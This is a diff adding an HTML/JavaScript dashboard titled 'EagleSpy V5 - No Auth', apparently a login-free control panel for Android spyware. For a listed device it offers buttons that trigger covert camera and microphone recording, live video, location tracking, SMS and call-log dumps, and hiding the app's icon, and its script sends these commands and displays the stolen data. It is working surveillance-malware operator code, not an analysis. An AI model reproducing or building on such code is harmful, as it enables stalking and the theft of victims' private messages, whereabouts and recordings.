@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EagleSpy V5 - No Auth</title>
+<style>
+  body { background: #0a0a0f; color: #ccc; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
+  h1 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; }
+  .device { border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 8px; background: #111; }
+  .device h3 { margin: 0 0 10px; color: #fff; display: flex; justify-content: space-between; align-items: center; }
+  .status { font-size: 0.8em; padding: 2px 8px; border-radius: 10px; background: #222; }
+  .online { color: #0f0; border: 1px solid #0f0; }
+  .offline { color: #777; border: 1px solid #555; }
+  .meta { font-size: 0.85em; color: #666; margin-bottom: 10px; }
+  
+  .btn-group { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
+  .btn-group button { 
+    background: #1a1a1a; 
+    border: 1px solid #444; 
+    color: #ddd; 
+    padding: 8px 15px; 
+    cursor: pointer; 
+    border-radius: 4px; 
+    font-size: 0.9em;
+    transition: all 0.2s;
+  }
+  .btn-group button:hover { background: #333; border-color: #00d4ff; color: #fff; }
+  .btn-group button:active { transform: translateY(1px); }
+
+  .live-view { display: none; margin-top: 20px; border: 1px solid #444; padding: 15px; background: #151515; border-radius: 8px; }
+  .live-view.active { display: block; animation: fadeIn 0.3s; }
+  
+  #log { margin-top: 20px; border: 1px solid #333; background: #050505; padding: 15px; height: 250px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #0f0; border-radius: 5px; }
+  
+  /* Result styling */
+  pre { white-space: pre-wrap; word-wrap: break-word; background: #111; padding: 10px; border-radius: 5px; }
+  img.preview { max-width: 100%; border: 1px solid #444; margin-top: 10px; }
+  iframe { width: 100%; height: 400px; border: none; background: #222; margin-top: 10px; }
+
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+</style>
+</head>
+<body>
+
+<h1>
+  🦅 EagleSpy V5 
+  <span style="font-size:0.5em;color:#666;font-weight:normal">Simple Dashboard</span>
+  <button onclick="location.reload()" style="float:right;background:#222;border:1px solid #444;color:#aaa;padding:5px 10px;border-radius:4px;cursor:pointer;font-size:0.5em">↻ Reload</button>
+</h1>
+
+<div id="devices-list">
+      <div class="device">
+        <h3>
+          SM-S908B 
+          <span class="status offline">
+             ○ OFFLINE
+          </span>
+        </h3>
+        <div class="meta">
+          ID: <span style="color:#aaa">7ab8f89370358bea</span> | 
+          IP: <span style="color:#aaa">7ab8f89370358bea</span> |
+          Last Seen: about 3 hours ago
+        </div>
+        
+        <div class="btn-group">
+          <!-- LIVE -->
+          <button onclick="cmd('10000', 'start_webrtc_stream')">🔴 Live Video</button>
+          <button onclick="cmd('10000', 'dump_localtime')">📍 Location</button>
+          <button onclick="cmd('10000', 'webcam_record', {back_camera: true})">🎥 Rec Back</button>
+          <button onclick="cmd('10000', 'webcam_record', {back_camera: false})">🤳 Rec Front</button>
+          <button onclick="cmd('10000', 'ambient_record', {duration: 10})">🎙️ Audio (10s)</button>
+          
+          <!-- DATA -->
+          <button onclick="cmd('10000', 'take_picture')">📸 Photo</button>
+          <button onclick="cmd('10000', 'dump_sysinfo')">ℹ️ Info</button>
+          <button onclick="cmd('10000', 'dump_sms')">💬 SMS</button>
+          <button onclick="cmd('10000', 'dump_calllogs')">📞 Calls</button>
+          
+          <!-- CONTROL -->
+          <button onclick="cmd('10000', 'hide_app')">🙈 Hide Icon</button>
+          <button onclick="cmd('10000', 'show_app')">👁️ Show Icon</button>
+          <button onclick="cmd('10000', 'set_audio_mode', {mode: 'silent'})">🔇 Silent</button>
+          <button onclick="cmd('10000', 'set_audio_mode', {mode: 'normal'})">🔊 Normal</button>
+        </div>
+      </div>
+</div>
+
+<div id="live-container" class="live-view">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:10px">
+    <h3 style="margin:0;color:#fff">Result View</h3>
+    <button onclick="document.getElementById('live-container').classList.remove('active')" style="background:#333;border:none;color:#fff;padding:5px 10px;cursor:pointer">Close ✕</button>
+  </div>
+  <div id="live-content"></div>
+</div>
+
+<div id="log">Dashboard ready. Waiting for commands...</div>
+
+<script>
+function log(msg, type='info') {
+  const el = document.getElementById('log');
+  const time = new Date().toLocaleTimeString();
+  const color = type === 'error' ? '#f55' : (type === 'success' ? '#0f0' : '#ccc');
+  el.innerHTML = `<div style="color:${color}"><span style="color:#555">[${time}]</span> ${msg}</div>` + el.innerHTML;
+}
+
+async function cmd(deviceId, command, params = {}) {
+  log(`Executing <b>${command}</b> on ${deviceId}...`, 'info');
+  
+  // Construct URL
+  let url = `/smartphones/${command}?smartphone_id=${deviceId}`;
+  let method = 'POST';
+  
+  // Special cases for URL mapping
+  if (command === 'take_picture') url = `/smartphones/take_picture?smartphone_id=${deviceId}`;
+  if (command === 'dump_localtime') { url = `/geo_locations/dump_location?smartphone_id=${deviceId}`; method = 'GET'; }
+  if (command === 'hide_app') { url = `/smartphones/hide_app?smartphone_id=${deviceId}`; method = 'GET'; }
+  if (command === 'show_app') { url = `/smartphones/show_app?smartphone_id=${deviceId}`; method = 'GET'; }
+  
+  // Append params
+  const qs = new URLSearchParams(params).toString();
+  if (qs) url += `&${qs}`;
+
+  try {
+    const res = await fetch(url, {
+      method: method,
+      headers: { 'Accept': 'text/javascript, application/json' }
+    });
+    
+    const text = await res.text();
+    
+    if (res.ok) {
+      log(`Command sent. Processing response...`, 'info');
+      
+      // Try parsing output
+      let output = null;
+      
+      // 1. Try "var commandOutput = ..." format (Rails JS views)
+      const match = text.match(/var\s+commandOutput\s*=\s*(.*);/);
+      if (match) {
+        try { output = JSON.parse(match[1]); } catch(e) { output = match[1]; }
+      } 
+      // 2. Try pure JSON
+      else {
+        try { output = JSON.parse(text); } catch(e) {}
+      }
+      
+      if (output) {
+        log(`Success! Received data.`, 'success');
+        showResult(command, output);
+      } else {
+        log(`Command sent (No immediate data returned). Check Logs tab.`, 'success');
+      }
+      
+    } else {
+      log(`Server Error: ${res.status}`, 'error');
+    }
+  } catch (e) {
+    log(`Network Error: ${e.message}`, 'error');
+  }
+}
+
+function showResult(command, data) {
+  const view = document.getElementById('live-container');
+  const content = document.getElementById('live-content');
+  view.classList.add('active');
+  
+  // Clear previous
+  content.innerHTML = '';
+  
+  // Handle different data types
+  
+  // 1. Location (Array or Object)
+  if (command === 'dump_localtime' || command === 'dump_location') {
+     // Check for Lat/Long in string array
+     let lat, long;
+     const str = Array.isArray(data) ? data.join(' ') : JSON.stringify(data);
+     
+     const latMatch = str.match(/Lat:?\s*([\d.-]+)/i);
+     const longMatch = str.match(/Long:?\s*([\d.-]+)/i);
+     
+     if (latMatch && longMatch) {
+       lat = latMatch[1]; long = longMatch[1];
+       content.innerHTML = `
+         <div style="margin-bottom:10px;font-size:1.2em;color:#00d4ff">📍 ${lat}, ${long}</div>
+         <iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${parseFloat(long)-0.01},${parseFloat(lat)-0.01},${parseFloat(long)+0.01},${parseFloat(lat)+0.01}&layer=mapnik&marker=${lat},${long}"></iframe>
+         <div style="margin-top:5px"><a href="https://www.google.com/maps?q=${lat},${long}" target="_blank" style="color:#fff;text-decoration:underline">Open in Google Maps</a></div>
+       `;
+     } else {
+       content.innerHTML = `<pre>${typeof data === 'object' ? JSON.stringify(data, null, 2) : data}</pre>`;
+     }
+  }
+  // 2. Images (URL)
+  else if (command === 'take_picture' || command === 'front_camera_snap') {
+     let url = null;
+     if (Array.isArray(data) && data[0] && data[0].includes('http')) url = data[0];
+     if (typeof data === 'string' && data.includes('http')) url = data;
+     
+     if (url) {
+       content.innerHTML = `<img src="${url}" class="preview" />`;
+       content.innerHTML += `<div style="margin-top:5px"><a href="${url}" download style="color:#00d4ff">Download Image</a></div>`;
+     } else {
+       content.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
+     }
+  }
+  // 3. WebRTC
+  else if (command === 'start_webrtc_stream') {
+     content.innerHTML = `<div style="padding:20px;text-align:center;color:#0f0">
+       <h2>📡 WebRTC Stream Initiated</h2>
+       <p>Please wait for the device to connect...</p>
+       <p style="color:#777;font-size:0.8em">Note: In this simplified dashboard, video playback requires manual handling or use the main dashboard for full WebRTC player.</p>
+     </div>`;
+  }
+  // 4. Default JSON/Text dump
+  else {
+     const text = Array.isArray(data) ? data.join('\n') : (typeof data === 'object' ? JSON.stringify(data, null, 2) : data);
+     content.innerHTML = `<pre>${text}</pre>`;
+  }
+}
+</script>
+
+</body>
+</html>
